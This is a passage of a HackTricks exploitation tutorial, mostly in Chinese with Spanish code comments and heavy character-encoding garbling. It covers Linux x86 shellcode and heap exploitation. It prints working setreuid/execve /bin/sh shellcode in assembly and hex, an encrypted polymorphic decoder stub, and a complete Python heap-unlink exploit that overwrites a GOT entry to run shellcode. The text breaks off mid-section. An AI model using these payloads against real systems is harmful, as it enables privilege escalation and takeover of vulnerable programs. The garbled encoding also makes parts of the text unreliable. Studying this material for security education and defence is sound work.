# Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep â€œ\_\_NR\_â€

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(â€œ/bin/shâ€, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 â€”> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** â€”> Returns a .o file\
**ld assembly.o -o shellcodeout** â€”> Generates an executable with the assembly code and we can extract the opcodes with **objdump**\
**objdump -d -Mintel ./shellcodeout** â€”> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**

```
char shellcode[] = â€œ\x31\xc0\x31\xdb\xb0\x01\xcd\x80â€

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```

ä¸ºäº†ç¡®ä¿ç³»ç»Ÿè°ƒç”¨è¢«æ­£ç¡®æ‰§è¡Œï¼Œåº”ç¼–è¯‘å‰ä¸€ä¸ªç¨‹åºå¹¶åœ¨**strace ./COMPILADO\_ç¨‹åº**ä¸­æŸ¥çœ‹ç³»ç»Ÿè°ƒç”¨ã€‚

åœ¨åˆ›å»ºshellcodeæ—¶ï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸ªæŠ€å·§ã€‚ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯è·³è½¬åˆ°ä¸€ä¸ªè°ƒç”¨ã€‚è¯¥è°ƒç”¨ä¼šè°ƒç”¨åŸå§‹ä»£ç ï¼Œå¹¶å°†EIPæ”¾å…¥å †æ ˆã€‚åœ¨callæŒ‡ä»¤ä¹‹åï¼Œæˆ‘ä»¬å·²ç»æ”¾å…¥äº†æ‰€éœ€çš„å­—ç¬¦ä¸²ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨è¯¥EIPæŒ‡å‘å­—ç¬¦ä¸²ï¼Œå¹¶ç»§ç»­æ‰§è¡Œä»£ç ã€‚

ä¾‹ **TRICK (/bin/sh)**:

```
jmp                 0x1f                                        ; Salto al Ãºltimo call
popl                %esi                                       ; Guardamos en ese la direcciÃ³n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=â€œ/bin/shâ€
leal                 0x8(%esi), %ecx      ; arg[2] = {â€œ/bin/shâ€, â€œ0â€}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(â€œ/bin/shâ€, [â€œ/bin/shâ€, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruciÃ³n
.string             \â€/bin/sh\â€                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">â€‹</span>
```

**ä½¿ç”¨å †æ ˆ(/bin/sh)çš„ç®€å•ESPï¼š**

```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; â€œ\0â€
push               dword 0x68732f2f ; â€œ//shâ€
push               dword 0x6e69622f; â€œ/binâ€
mov                ebx, esp                     ; arg1 = â€œ/bin//sh\0â€
push               eax                             ; Null -> args[1]
push               ebx                             ; â€œ/bin/sh\0â€ -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(â€œ/bin/shâ€, args[â€œ/bin/shâ€, â€œNULLâ€], NULL)
```

**EJ FNSTENV:**

```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutÃ³ fabs
â€¦
```

**Egg Hunter:**

è¿™æ˜¯ä¸€å°æ®µä»£ç ï¼Œç”¨äºéå†ä¸è¿›ç¨‹å…³è”çš„å†…å­˜é¡µé¢ï¼Œä»¥å¯»æ‰¾å…¶ä¸­å­˜å‚¨çš„shellcodeï¼ˆæŸ¥æ‰¾shellcodeä¸­çš„æŸä¸ªç­¾åï¼‰ã€‚åœ¨åªæœ‰å°‘é‡ç©ºé—´ç”¨äºæ³¨å…¥ä»£ç çš„æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ã€‚

**å¤šæ€Shellcode**

è¿™äº›æ˜¯åŠ å¯†çš„shellcodeï¼Œå…¶ä¸­åŒ…å«ä¸€å°æ®µä»£ç ç”¨äºè§£å¯†å¹¶è·³è½¬åˆ°å®ƒï¼Œä½¿ç”¨Call-PopæŠ€å·§ï¼Œè¿™æ˜¯ä¸€ä¸ª**å‡¯æ’’åŠ å¯†çš„ç¤ºä¾‹**ï¼š

```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerÃ¡)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;AquÃ­ va el shellcode
```

## **5.è¡¥å……æ–¹æ³•**

**MuratæŠ€æœ¯**

åœ¨Linuxä¸­ï¼Œæ‰€æœ‰ç¨‹åºéƒ½ä»0xbfffffffå¼€å§‹æ˜ å°„ã€‚

é€šè¿‡æŸ¥çœ‹Linuxä¸­æ–°è¿›ç¨‹å †æ ˆçš„æ„å»ºæ–¹å¼ï¼Œå¯ä»¥å¼€å‘ä¸€ç§åˆ©ç”¨ç¨‹åºåœ¨ä»…åŒ…å«shellcodeå˜é‡çš„ç¯å¢ƒä¸­å¯åŠ¨çš„æ¼æ´ã€‚å› æ­¤ï¼Œå¯ä»¥è®¡ç®—å‡ºå…¶åœ°å€ä¸ºï¼šaddr = 0xbfffffff - 4 - strlen(å®Œæ•´å¯æ‰§è¡Œæ–‡ä»¶åç§°) - strlen(shellcode)

è¿™æ ·å°±å¯ä»¥è½»æ¾åœ°è·å¾—åŒ…å«shellcodeçš„ç¯å¢ƒå˜é‡çš„åœ°å€ã€‚

è¿™æ˜¯å› ä¸ºexecleå‡½æ•°å…è®¸åˆ›å»ºä»…åŒ…å«æ‰€éœ€ç¯å¢ƒå˜é‡çš„ç¯å¢ƒã€‚

##

###

###

###

###

### **æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ°ç¼“å†²åŒºæº¢å‡º**

**sprintf**å°†æ ¼å¼åŒ–å­—ç¬¦ä¸²**ç§»åŠ¨åˆ°**å˜é‡ä¸­ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥æ»¥ç”¨å­—ç¬¦ä¸²çš„æ ¼å¼ä»¥å¯¼è‡´å°†å†…å®¹å¤åˆ¶åˆ°çš„å˜é‡ä¸­å‘ç”Ÿç¼“å†²åŒºæº¢å‡ºã€‚\
ä¾‹å¦‚ï¼Œæœ‰æ•ˆè½½è·`%.44xAAAA`å°†åœ¨å˜é‡ä¸­**å†™å…¥44B+"AAAA"**ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚

### **\_\_atexitç»“æ„**

{% hint style="danger" %}
ç°åœ¨å¾ˆå°‘**åˆ©ç”¨æ­¤æ–¹æ³•**ã€‚
{% endhint %}

**`atexit()`æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå…¶å‚æ•°æ˜¯å…¶ä»–å‡½æ•°**ã€‚è¿™äº›**å‡½æ•°**å°†åœ¨æ‰§è¡Œ\*\*`exit()`**æˆ–**main**è¿”å›æ—¶æ‰§è¡Œã€‚**\
**å¦‚æœå¯ä»¥**ä¿®æ”¹**å…¶ä¸­ä»»ä½•ä¸€ä¸ª**å‡½æ•°**çš„åœ°å€ä»¥æŒ‡å‘shellcodeï¼Œé‚£ä¹ˆå°†**æ§åˆ¶**è¯¥**è¿›ç¨‹\*\*ï¼Œä½†ç›®å‰è¿™æ›´åŠ å¤æ‚ã€‚\
ç›®å‰è¦æ‰§è¡Œçš„**å‡½æ•°åœ°å€**éšè—åœ¨å‡ ä¸ªç»“æ„åé¢ï¼Œæœ€ç»ˆæŒ‡å‘çš„åœ°å€ä¸æ˜¯å‡½æ•°åœ°å€ï¼Œè€Œæ˜¯**ä½¿ç”¨XORåŠ å¯†å’Œéšæœºå¯†é’¥è¿›è¡Œåç§»**ã€‚å› æ­¤ï¼Œç›®å‰è¿™ç§æ”»å‡»å‘é‡**åœ¨x86å’Œx64\_86ä¸Šå¹¶ä¸æ˜¯å¾ˆæœ‰ç”¨**ã€‚\
**åŠ å¯†å‡½æ•°**æ˜¯\*\*`PTR_MANGLE`**ã€‚å…¶ä»–æ¶æ„ï¼Œå¦‚m68kã€mips32ã€mips64ã€aarch64ã€armã€hppaç­‰ï¼Œä¸å®ç°åŠ å¯†å‡½æ•°ï¼Œå› ä¸ºå®ƒ**è¿”å›\*\*ä¸è¾“å…¥ç›¸åŒçš„å†…å®¹ã€‚å› æ­¤ï¼Œè¿™äº›æ¶æ„å¯ä»¥é€šè¿‡æ­¤å‘é‡å—åˆ°æ”»å‡»ã€‚

### **setjmp()å’Œlongjmp()**

{% hint style="danger" %}
ç°åœ¨å¾ˆå°‘**åˆ©ç”¨æ­¤æ–¹æ³•**ã€‚
{% endhint %}

**`Setjmp()`å…è®¸ä¿å­˜**ä¸Šä¸‹æ–‡ï¼ˆå¯„å­˜å™¨ï¼‰\
**`longjmp()`å…è®¸æ¢å¤**ä¸Šä¸‹æ–‡ã€‚\
ä¿å­˜çš„å¯„å­˜å™¨æœ‰ï¼š`EBXã€ESIã€EDIã€ESPã€EIPã€EBP`\
é—®é¢˜åœ¨äºEIPå’ŒESPé€šè¿‡\*\*`PTR_MANGLE`**å‡½æ•°ä¼ é€’ï¼Œå› æ­¤**æ˜“å—æ”»å‡»çš„æ¶æ„ä¸ä¸Šè¿°ç›¸åŒ\*\*ã€‚\
å®ƒä»¬å¯¹é”™è¯¯æ¢å¤æˆ–ä¸­æ–­å¾ˆæœ‰ç”¨ã€‚\
ä½†æ ¹æ®æˆ‘æ‰€äº†è§£ï¼Œå…¶ä»–å¯„å­˜å™¨æ²¡æœ‰å—åˆ°ä¿æŠ¤ï¼Œå› æ­¤å¦‚æœåœ¨è¢«è°ƒç”¨çš„å‡½æ•°å†…éƒ¨å­˜åœ¨`call ebx`ã€`call esi`æˆ–`call edi`ï¼Œåˆ™å¯ä»¥æ¥ç®¡æ§åˆ¶ã€‚æˆ–è€…è¿˜å¯ä»¥ä¿®æ”¹EBPä»¥ä¿®æ”¹ESPã€‚

**C++ä¸­çš„VTableå’ŒVPTR**

æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª**Vtable**ï¼Œå®ƒæ˜¯ä¸€ä¸ª**æŒ‡å‘æ–¹æ³•çš„æŒ‡é’ˆæ•°ç»„**ã€‚

æ¯ä¸ª**ç±»**çš„å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª**VPtr**ï¼Œå®ƒæ˜¯æŒ‡å‘å…¶ç±»æ•°ç»„çš„**æŒ‡é’ˆ**ã€‚VPtræ˜¯æ¯ä¸ªå¯¹è±¡å¤´çš„ä¸€éƒ¨åˆ†ï¼Œå› æ­¤å¦‚æœå®ç°**VPtr**çš„**è¦†ç›–**ï¼Œåˆ™å¯ä»¥å°†å…¶**ä¿®æ”¹**ä¸ºæŒ‡å‘è™šæ‹Ÿæ–¹æ³•ï¼Œä»¥ä¾¿æ‰§è¡Œå‡½æ•°æ—¶è½¬åˆ°shellcodeã€‚

## **é¢„é˜²æªæ–½å’Œè§„é¿æ–¹æ³•**

###

**æ›¿æ¢Libsafe**

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¿€æ´»ï¼šLD\_PRELOAD=/lib/libsafe.so.2\
æˆ–\
â€œ/lib/libsave.so.2â€ > /etc/ld.so.preload

é€šè¿‡å®‰å…¨å‡½æ•°æ‹¦æˆªå¯¹æŸäº›ä¸å®‰å…¨å‡½æ•°çš„è°ƒç”¨ã€‚è¿™ä¸æ˜¯æ ‡å‡†åŒ–çš„ï¼ˆä»…é€‚ç”¨äºx86ï¼Œä¸é€‚ç”¨äºä½¿ç”¨-fomit-frame-pointerç¼–è¯‘ï¼Œä¸é€‚ç”¨äºé™æ€ç¼–è¯‘ï¼Œä¸æ˜¯æ‰€æœ‰æ˜“å—æ”»å‡»çš„å‡½æ•°éƒ½å˜å¾—å®‰å…¨ï¼ŒLD\_PRELOADåœ¨å…·æœ‰suidæƒé™çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ— æ•ˆï¼‰ã€‚

**ASCIIè£…ç”²åœ°å€ç©ºé—´**

å°†å…±äº«åº“åŠ è½½åˆ°0x00000000è‡³0x00ffffffï¼Œä»¥ä¾¿å§‹ç»ˆå­˜åœ¨ä¸€ä¸ªå­—èŠ‚0x00ã€‚ç„¶è€Œï¼Œè¿™å®é™…ä¸Šå‡ ä¹æ— æ³•é˜»æ­¢ä»»ä½•æ”»å‡»ï¼Œå°¤å…¶æ˜¯åœ¨å°ç«¯ç³»ç»Ÿä¸­ã€‚

**ret2plt**

é€šè¿‡æ‰§è¡ŒROPï¼Œè°ƒç”¨pltä¸­çš„strcpy@pltå‡½æ•°ï¼Œå¹¶æŒ‡å‘GOTçš„æ¡ç›®ï¼Œå°†è¦è°ƒç”¨çš„å‡½æ•°ï¼ˆsystem()ï¼‰çš„ç¬¬ä¸€ä¸ªå­—èŠ‚å¤åˆ¶è¿‡æ¥ã€‚ç„¶åé‡å¤æ­¤è¿‡ç¨‹ï¼ŒæŒ‡å‘GOT+1ï¼Œå¹¶å¤åˆ¶system()çš„ç¬¬äºŒä¸ªå­—èŠ‚... æœ€åè°ƒç”¨ä¿å­˜åœ¨GOTä¸­çš„åœ°å€ï¼Œå³system()ã€‚

**ä½¿ç”¨chroot()åˆ›å»ºç‰¢ç¬¼**

debootstrap -arch=i386 hardy /home/user â€”> åœ¨ç‰¹å®šå­ç›®å½•ä¸‹å®‰è£…åŸºæœ¬ç³»ç»Ÿ

ç®¡ç†å‘˜å¯ä»¥é€šè¿‡æ‰§è¡Œä»¥ä¸‹æ“ä½œæ¥é€€å‡ºè¿™äº›ç‰¢ç¬¼ï¼šmkdir foo; chroot foo; cd ..

**ä»£ç æ’æ¡©**

Valgrind â€”> æ£€æŸ¥é”™è¯¯\
Memcheck\
RADï¼ˆReturn Address Defenderï¼‰\
Insure++

## **8 å †æº¢å‡ºï¼šåŸºæœ¬åˆ©ç”¨**

**å·²åˆ†é…å—**

prev\_size |\
size | â€”Header\
\*mem | æ•°æ®

**ç©ºé—²å—**

prev\_size |\
size |\
\*fd | å‰å‘å—æŒ‡é’ˆ\
\*bk | åå‘å—æŒ‡é’ˆ â€”Header\
\*mem | æ•°æ®

ç©ºé—²å—ä»¥åŒå‘é“¾è¡¨ï¼ˆbinï¼‰çš„å½¢å¼å­˜åœ¨ï¼Œæ°¸è¿œä¸ä¼šæœ‰ä¸¤ä¸ªç›¸é‚»çš„ç©ºé—²å—ï¼ˆå®ƒä»¬ä¼šåˆå¹¶ï¼‰ã€‚

åœ¨â€œsizeâ€ä¸­æœ‰ä¸€äº›ä½ç”¨äºæŒ‡ç¤ºï¼šå‰ä¸€ä¸ªå—æ˜¯å¦æ­£åœ¨ä½¿ç”¨ï¼Œå—æ˜¯å¦é€šè¿‡mmap()åˆ†é…ï¼Œå—æ˜¯å¦å±äºä¸»è¦çš„arenaã€‚

é‡Šæ”¾å—æ—¶ï¼Œå¦‚æœç›¸é‚»å—ä¸­æœ‰ä»»ä½•ä¸€ä¸ªæ˜¯ç©ºé—²çš„ï¼Œåˆ™é€šè¿‡unlink()å®å°†å®ƒä»¬åˆå¹¶ï¼Œå¹¶å°†æœ€å¤§çš„æ–°å—ä¼ é€’ç»™frontlink()ä»¥å°†å…¶æ’å…¥åˆ°é€‚å½“çš„binä¸­ã€‚

unlink(){\
BK = P->bk; â€”> æ–°å—çš„BKæ˜¯ä¹‹å‰ç©ºé—²å—çš„BK\
FD = P->fd; â€”> æ–°å—çš„FDæ˜¯ä¹‹å‰ç©ºé—²å—çš„FD\
FD->bk = BK; â€”> ä¸‹ä¸€ä¸ªå—çš„BKæŒ‡å‘æ–°å—\
BK->fd = FD; â€”> å‰ä¸€ä¸ªå—çš„FDæŒ‡å‘æ–°å—\
}

å› æ­¤ï¼Œå¦‚æœæˆåŠŸä¿®æ”¹äº†P->bkä¸ºshellcodeçš„åœ°å€ï¼Œå¹¶å°†P->fdä¿®æ”¹ä¸ºGOTæˆ–DTORSä¸­æ¡ç›®çš„åœ°å€å‡å»12ï¼Œå°±å¯ä»¥å®ç°ï¼š

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

è¿™æ ·åœ¨ç¨‹åºé€€å‡ºæ—¶å°†æ‰§è¡Œshellcodeã€‚

æ­¤å¤–ï¼Œunlink()çš„ç¬¬å››æ¡è¯­å¥ä¼šå†™å…¥ä¸€äº›å†…å®¹ï¼Œå› æ­¤shellcodeå¿…é¡»è¿›è¡Œä¿®å¤ï¼š

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) â€”> è¿™å°†ä»shellcodeçš„ç¬¬8ä¸ªå­—èŠ‚å¼€å§‹å†™å…¥4ä¸ªå­—èŠ‚ï¼Œå› æ­¤shellcodeçš„ç¬¬ä¸€æ¡æŒ‡ä»¤å¿…é¡»æ˜¯è·³è½¬æŒ‡ä»¤ä»¥è·³è¿‡æ­¤å†…å®¹ï¼Œç„¶åè¿›å…¥ä¸€ç³»åˆ—nopæŒ‡ä»¤ï¼Œæœ€ç»ˆæ‰§è¡Œshellcodeçš„å…¶ä½™éƒ¨åˆ†ã€‚

å› æ­¤ï¼Œåˆ©ç”¨ç¨‹åºå¦‚ä¸‹ï¼š

åœ¨buffer1ä¸­æ’å…¥shellcodeï¼Œä»¥è·³è½¬æŒ‡ä»¤å¼€å¤´ï¼Œä½¿å…¶è·³è½¬åˆ°nopæˆ–shellcodeçš„å…¶ä½™éƒ¨åˆ†ã€‚

åœ¨shellcodeä¹‹åå¡«å……ï¼Œç›´åˆ°è¾¾åˆ°ä¸‹ä¸€ä¸ªå—çš„prev\_sizeå’Œsizeå­—æ®µã€‚åœ¨è¿™äº›ä½ç½®ä¸Šæ’å…¥0xfffffff0ï¼ˆä»¥è¦†ç›–prev\_sizeå¹¶è®¾ç½®ç©ºé—²ä½ï¼‰å’Œâ€œ-4â€ï¼ˆ0xfffffffcï¼‰åœ¨sizeä¸­ï¼ˆä»¥ä¾¿åœ¨ç¬¬ä¸‰ä¸ªå—æ£€æŸ¥ç¬¬äºŒä¸ªå—æ˜¯å¦ç©ºé—²æ—¶å®é™…ä¸Šè½¬åˆ°ä¿®æ”¹åçš„prev\_sizeï¼ŒæŒ‡ç¤ºç¬¬äºŒä¸ªå—æ˜¯ç©ºé—²çš„ï¼‰-> è¿™æ ·ï¼Œå½“free()è°ƒæŸ¥æ—¶ï¼Œå®ƒå°†è½¬åˆ°ç¬¬ä¸‰ä¸ªå—çš„sizeï¼Œä½†å®é™…ä¸Šä¼šè½¬åˆ°ç¬¬äºŒä¸ªå— - 4ï¼Œå¹¶è®¤ä¸ºç¬¬äºŒä¸ªå—æ˜¯ç©ºé—²çš„ã€‚ç„¶åè°ƒç”¨**unlink()**ã€‚ åœ¨è°ƒç”¨unlink()æ—¶ï¼Œå°†ä½¿ç”¨ç¬¬äºŒå—çš„å‰å‡ ä¸ªæ•°æ®ä½œä¸ºP->fdï¼Œå› æ­¤å°†åœ¨é‚£é‡Œæ’å…¥è¦è¦†ç›–çš„åœ°å€ - 12ï¼ˆå› ä¸ºåœ¨FD->bkä¸­å°†åœ¨ä¿å­˜åœ¨FDä¸­çš„åœ°å€ä¸ŠåŠ 12ï¼‰ã€‚ç„¶ååœ¨è¯¥åœ°å€ä¸­æ’å…¥ç¬¬äºŒå—ä¸­æ‰¾åˆ°çš„ç¬¬äºŒä¸ªåœ°å€ï¼Œæˆ‘ä»¬å¸Œæœ›å®ƒæ˜¯shellcodeçš„åœ°å€ï¼ˆP->bkä¼ªé€ ï¼‰ã€‚

```python
from struct import *
import os

shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12bytes padding
shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \
"\x80\xe8\xdc\xff\xff\xff/bin/sh";

prev_size = pack("<I", 0xfffffff0) #ç¡®ä¿å‰ä¸€ä¸ªå—çš„ç©ºé—²ä½ä¸º1
fake_size = pack("<I", 0xfffffffc) #-4ï¼Œä½¿ç¬¬ä¸‰å—çš„â€œsizeâ€è¢«è®¤ä¸ºåœ¨4å­—èŠ‚ä¹‹å‰ï¼ˆæŒ‡å‘prev_sizeï¼‰ï¼Œå› ä¸ºå®ƒæ£€æŸ¥ç¬¬äºŒå—æ˜¯å¦ç©ºé—²
addr_sc = pack("<I", 0x0804a008 + 8) #payloadå¼€å¤´åŠ å…¥8å­—èŠ‚å¡«å……
got_free = pack("<I", 0x08048300 - 12) #free()åœ¨pltä¸­çš„åœ°å€-12ï¼ˆå°†è¢«è¦†ç›–ä»¥ç¬¬äºŒæ¬¡è°ƒç”¨freeæ—¶æ‰§è¡Œshellcodeï¼‰

payload = "aaaabbbb" + shellcode + "b"*(512-len(shellcode)-8) #payloadä»¥8å­—èŠ‚å¡«å……å¼€å§‹
payload += prev_size + fake_size + got_free + addr_sc #ä¿®æ”¹ç¬¬äºŒå—ï¼Œgot_freeæŒ‡å‘æˆ‘ä»¬å°†ä¿å­˜åœ°å€addr_sc + 12çš„ä½ç½®
os.system("./8.3.o " + payload)
```

**unset()åå‘é‡Šæ”¾ï¼ˆwargameï¼‰**

æˆ‘ä»¬æ§åˆ¶3ä¸ªè¿ç»­çš„å—ï¼Œå¹¶æŒ‰ç›¸åé¡ºåºé‡Šæ”¾å®ƒä»¬ã€‚

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼š

åœ¨å—cä¸­æ”¾ç½®shellcode

æˆ‘ä»¬ä½¿ç”¨å—aæ¥è¦†ç›–å—bï¼Œä½¿å¾—sizeå­—æ®µçš„PREV\_INUSEä½è¢«ç¦ç”¨ï¼Œä»¥ä¾¿è®¤ä¸ºå—aæ˜¯ç©ºé—²çš„ã€‚

æ­¤å¤–ï¼Œåœ¨å—bçš„å¤´éƒ¨è¦†ç›–sizeä½¿å…¶å€¼ä¸º-4ã€‚

å› æ­¤ï¼Œç¨‹åºä¼šè®¤ä¸ºâ€œaâ€æ˜¯ç©ºé—²çš„å¹¶ä¸”åœ¨ä¸€ä¸ªbinä¸­ï¼Œå› æ­¤ä¼šè°ƒç”¨unlink()æ¥è§£é™¤ç»‘å®šã€‚ç„¶è€Œï¼Œç”±äºå¤´éƒ¨çš„PREV\_SIZEä¸º-4ã€‚å®ƒä¼šè®¤ä¸ºâ€œaâ€å—å®é™…ä¸Šä»b+4å¼€å§‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä¼šå¯¹ä»b+4å¼€å§‹çš„å—æ‰§è¡Œunlink()ï¼Œå› æ­¤åœ¨b+12å¤„å°†æ˜¯æŒ‡é’ˆâ€œfdâ€ï¼Œåœ¨b+16å¤„å°†æ˜¯æŒ‡é’ˆâ€œbkâ€ã€‚

è¿™æ ·ï¼Œå¦‚æœåœ¨bkä¸­æ”¾å…¥shellcodeçš„åœ°å€ï¼Œå¹¶åœ¨fdä¸­æ”¾å…¥å‡½æ•°â€œputs()â€-12çš„åœ°å€ï¼Œæˆ‘ä»¬å°±æœ‰äº†æœ‰æ•ˆè½½è¯ã€‚

**FrontlinkæŠ€æœ¯**

å½“é‡Šæ”¾æŸä¸ªå—æ—¶ï¼Œå…¶ç›¸é‚»å—å‡ä¸ç©ºé—²ï¼Œä¸ä¼šè°ƒç”¨unlink()ï¼Œè€Œæ˜¯ç›´æ¥è°ƒç”¨frontlink()ã€‚

è¿™æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„æ¼æ´ï¼Œå½“æ”»å‡»çš„mallocä»ä¸è¢«é‡Šæ”¾ï¼ˆfree()ï¼‰æ—¶ã€‚

éœ€è¦ï¼š

ä¸€ä¸ªå¯ä»¥é€šè¿‡æ•°æ®è¾“å…¥å‡½æ•°æº¢å‡ºçš„ç¼“å†²åŒº

ä¸æ­¤ç›¸é‚»çš„ä¸€ä¸ªç¼“å†²åŒºï¼Œåº”è¯¥è¢«é‡Šæ”¾ï¼Œå¹¶ä¸”é€šè¿‡å‰ä¸€ä¸ªç¼“å†²åŒºçš„æº¢å‡ºå°†å…¶å¤´éƒ¨çš„fdå­—æ®µä¿®æ”¹

ä¸€ä¸ªè¦é‡Šæ”¾çš„ç¼“å†²åŒºï¼Œå…¶å¤§å°å¤§äº512ä½†å°äºå‰ä¸€ä¸ªç¼“å†²åŒº

åœ¨ç¬¬3æ­¥ä¹‹å‰å£°æ˜çš„ä¸€ä¸ªç¼“å†²åŒºï¼Œå…è®¸è¦†ç›–å…¶prev\_size

é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯ä»¥æ— åºåœ°è¦†ç›–ä¸¤ä¸ªmallocï¼Œå¹¶ä¸”ä¸€ä¸ªå—æ§åˆ¶åœ°é‡Šæ”¾ï¼Œæˆ‘ä»¬å¯ä»¥è¿›è¡Œåˆ©ç”¨ã€‚

**åŒé‡free()æ¼æ´**

å¦‚æœä¸¤æ¬¡ä½¿ç”¨ç›¸åŒæŒ‡é’ˆè°ƒç”¨free()ï¼Œåˆ™ä¼šæœ‰ä¸¤ä¸ªbinæŒ‡å‘ç›¸åŒåœ°å€ã€‚

å¦‚æœè¦é‡æ–°ä½¿ç”¨ä¸€ä¸ªï¼Œå¯ä»¥è½»æ¾åˆ†é…ã€‚å¦‚æœè¦ä½¿ç”¨å¦ä¸€ä¸ªï¼Œåˆ™å°†åˆ†é…ç›¸åŒçš„ç©ºé—´ï¼Œå› æ­¤æˆ‘ä»¬å°†æœ‰ä¼ªé€ çš„â€œfdâ€å’Œâ€œbkâ€æŒ‡é’ˆï¼Œè¿™äº›æŒ‡é’ˆæ˜¯ç”±å‰ä¸€ä¸ªä¿ç•™å†™å…¥çš„æ•°æ®ã€‚

**After free()**

é‡æ–°ä½¿ç”¨å…ˆå‰é‡Šæ”¾çš„æŒ‡é’ˆè€Œæ²¡æœ‰æ§åˆ¶ã€‚

## **8å †æº¢å‡ºï¼šé«˜çº§åˆ©ç”¨**

ä¿®æ”¹unlink()å‡½æ•°åï¼ŒUnlink()å’ŒFrontLink()æŠ€æœ¯è¢«åˆ é™¤ã€‚

**The house of mind**

åªéœ€ä¸€æ¬¡free()è°ƒç”¨å³å¯è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œã€‚éœ€è¦æ‰¾åˆ°ä¸€ä¸ªç¬¬äºŒå—ï¼Œå¯ä»¥è¢«å‰ä¸€ä¸ªå—æº¢å‡ºå¹¶é‡Šæ”¾ã€‚

è°ƒç”¨free()ä¼šè°ƒç”¨public\_free(mem)ï¼Œå®ƒæ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š

mstate ar\_ptr;

